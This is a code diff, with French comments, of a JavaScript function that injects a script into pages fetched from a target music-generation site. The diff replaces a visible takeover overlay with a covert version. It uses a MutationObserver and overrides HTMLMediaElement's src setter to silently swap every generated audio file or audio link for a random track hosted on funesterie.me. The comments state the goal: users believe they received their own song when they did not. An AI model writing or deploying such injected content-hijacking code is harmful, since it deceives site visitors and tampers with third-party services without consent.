@@ -105,32 +105,16 @@ function fetchPage(url) {
 }
 
 function injectGenjutsu(html, targetSite, lyrics) {
-  // Le site fonctionne normalement. MAIS dès qu'une production musicale est lancée,
-  // le résultat est détourné : c'est Djeff qui rap sur le thème demandé.
-  // Le visiteur tape son prompt, attend sa chanson... et c'est Djeff qui sort.
+  // GENJUTSU INVISIBLE : le site fonctionne tel quel.
+  // Quand il génère une chanson et retourne un player audio/lien mp3,
+  // on remplace la source audio par une production Djeff Suno.
+  // L'utilisateur croit avoir sa chanson. C'est Djeff qui chante.
   const injection = `
-<!-- SHARINGAN GENJUTSU — Route switching -->
-<style>
-#djeff-takeover{position:fixed;inset:0;z-index:999999;background:rgba(5,0,15,.98);display:none;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#eee;padding:2rem;overflow:auto}
-#djeff-takeover.active{display:flex}
-#djeff-takeover h1{font-size:2rem;background:linear-gradient(135deg,#7b2ff7,#f72585);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:.5rem}
-#djeff-takeover audio{width:90%;max-width:500px;margin:1rem 0}
-#djeff-takeover .lyrics{background:#111119;border:1px solid rgba(123,47,247,.3);border-radius:12px;padding:1.2rem;text-align:left;white-space:pre-line;font-size:.82rem;line-height:1.5;color:#f0c0ff;max-width:500px;margin:.8rem 0;max-height:200px;overflow-y:auto}
-#djeff-takeover .info{color:#777;font-size:.7rem;margin:.5rem 0}
-#djeff-takeover .btn{padding:.7rem 1.8rem;background:linear-gradient(135deg,#7b2ff7,#f72585);color:#fff;text-decoration:none;border-radius:8px;font-weight:700;font-size:.9rem;margin-top:.8rem}
-</style>
-<div id="djeff-takeover">
-  <h1>DJEFF ENGINE</h1>
-  <p style="color:#ccc;font-size:.9rem">Ta direction a été interceptée. Djeff rap dessus.</p>
-  <audio id="djeff-audio" controls autoplay></audio>
-  <div class="lyrics" id="djeff-lyrics">${lyrics.replace(/"/g, '&quot;').replace(/</g, '&lt;')}</div>
-  <div class="info">Chaque production sur ce site passe par Djeff Engine.<br>Le chanteur prévu a été remplacé. C'est le Genjutsu.</div>
-  <a href="https://vivy.funesterie.me" class="btn">Le vrai studio → Vivy</a>
-</div>
+<!-- SHARINGAN -->
 <script>
 (function(){
-  // TRACKS DJEFF — jukebox aléatoire
-  var djeffTracks = [
+  // Tracks Djeff Suno — le résultat que l'utilisateur recevra à la place
+  var djeff = [
     "https://a11.funesterie.me/clips/djeff-cypher/01---Le-Metre-du-Rap-Game.mp3",
     "https://a11.funesterie.me/clips/djeff-cypher/02---Maitre-du-Raptor.mp3",
     "https://a11.funesterie.me/clips/djeff-cypher/03---La-Funesterie-a-encore-frappe.mp3",
@@ -140,76 +124,47 @@ function injectGenjutsu(html, targetSite, lyrics) {
     "https://a11.funesterie.me/clips/djeff-cypher/07---L-Echappatoire.mp3",
     "https://a11.funesterie.me/clips/djeff-cypher/08---Carrehub.mp3"
   ];
+  var pick = function() { return djeff[Math.floor(Math.random() * djeff.length)]; };
 
-  // Mots-clés qui indiquent une DIRECTION (prompt musical, production, génération)
-  var directionWords = ['generate','create','produce','compose','make','write','prompt','lyrics','song','music','beat','style','genre','mood','vocal','sing','rap','melody','hook','verse','chorus'];
+  // Observer le DOM : dès qu'un <audio> ou un lien .mp3/.wav apparaît, on swap la source
+  var observer = new MutationObserver(function(mutations) {
+    mutations.forEach(function(m) {
+      m.addedNodes.forEach(function(node) {
+        if (node.nodeType !== 1) return;
+        // Audio elements
+        var audios = node.tagName === 'AUDIO' ? [node] : (node.querySelectorAll ? Array.from(node.querySelectorAll('audio')) : []);
+        audios.forEach(function(a) {
+          if (a.src && !a.src.includes('funesterie')) { a.src = pick(); }
+          var sources = a.querySelectorAll('source');
+          sources.forEach(function(s) { if (s.src && !s.src.includes('funesterie')) s.src = pick(); });
+        });
+        // Links to audio files
+        var links = node.tagName === 'A' ? [node] : (node.querySelectorAll ? Array.from(node.querySelectorAll('a[href]')) : []);
+        links.forEach(function(a) {
+          if (a.href && /\\.(mp3|wav|m4a|ogg|flac)/i.test(a.href) && !a.href.includes('funesterie')) {
+            a.href = pick();
+          }
+        });
+      });
+    });
+  });
+  observer.observe(document.body || document.documentElement, { childList: true, subtree: true });
 
-  // Détecter les inputs de direction (textarea, input text avec un prompt musical)
-  function isDirectionInput(el) {
-    if (!el) return false;
-    var val = (el.value || el.textContent || el.innerText || '').toLowerCase();
-    if (val.length < 5) return false;
-    var hits = 0;
-    for (var i = 0; i < directionWords.length; i++) {
-      if (val.includes(directionWords[i])) hits++;
-    }
-    return hits >= 1 && val.length > 10;
+  // Aussi intercepter les audio.src qui changent dynamiquement (SPA)
+  var origSet = Object.getOwnPropertyDescriptor(HTMLMediaElement.prototype, 'src');
+  if (origSet && origSet.set) {
+    Object.defineProperty(HTMLMediaElement.prototype, 'src', {
+      set: function(val) {
+        if (val && typeof val === 'string' && /\\.(mp3|wav|m4a|ogg)/i.test(val) && !val.includes('funesterie')) {
+          origSet.set.call(this, pick());
+        } else {
+          origSet.set.call(this, val);
+        }
+      },
+      get: origSet.get,
+      configurable: true
+    });
   }
-
-  // Intercepter les boutons de génération
-  function isGenerateButton(el) {
-    if (!el) return false;
-    var text = (el.textContent || el.value || el.title || el.ariaLabel || '').toLowerCase();
-    var triggerWords = ['generate','create','produce','make','compose','start','submit','go','render'];
-    for (var i = 0; i < triggerWords.length; i++) {
-      if (text.includes(triggerWords[i])) return true;
-    }
-    return false;
-  }
-
-  function activateDjeff() {
-    var panel = document.getElementById('djeff-takeover');
-    var audio = document.getElementById('djeff-audio');
-    panel.classList.add('active');
-    // Random track de la jukebox Djeff
-    audio.src = djeffTracks[Math.floor(Math.random() * djeffTracks.length)];
-    audio.play().catch(function(){});
-    console.log('[SHARINGAN] Direction interceptée → Djeff Engine prend le mic.');
-  }
-
-  // Écouter les clics sur les boutons generate (capture phase)
-  document.addEventListener('click', function(e) {
-    var btn = e.target.closest('button, [role=button], input[type=submit], a.btn, .btn, [data-action]');
-    if (btn && isGenerateButton(btn)) {
-      // Vérifier s'il y a une direction (un prompt rempli quelque part)
-      var inputs = document.querySelectorAll('textarea, input[type=text], [contenteditable=true]');
-      var hasDirection = false;
-      for (var i = 0; i < inputs.length; i++) {
-        if (isDirectionInput(inputs[i])) { hasDirection = true; break; }
-      }
-      if (hasDirection) {
-        e.preventDefault();
-        e.stopPropagation();
-        e.stopImmediatePropagation();
-        activateDjeff();
-      }
-      // Pas de direction = on laisse passer (le site fonctionne normalement)
-    }
-  }, true);
-
-  // Formulaires aussi
-  document.addEventListener('submit', function(e) {
-    var inputs = e.target.querySelectorAll('textarea, input[type=text]');
-    var hasDirection = false;
-    for (var i = 0; i < inputs.length; i++) {
-      if (isDirectionInput(inputs[i])) { hasDirection = true; break; }
-    }
-    if (hasDirection) {
-      e.preventDefault();
-      e.stopPropagation();
-      activateDjeff();
-    }
-  }, true);
 })();
 </script>
 <!-- /SHARINGAN -->`;
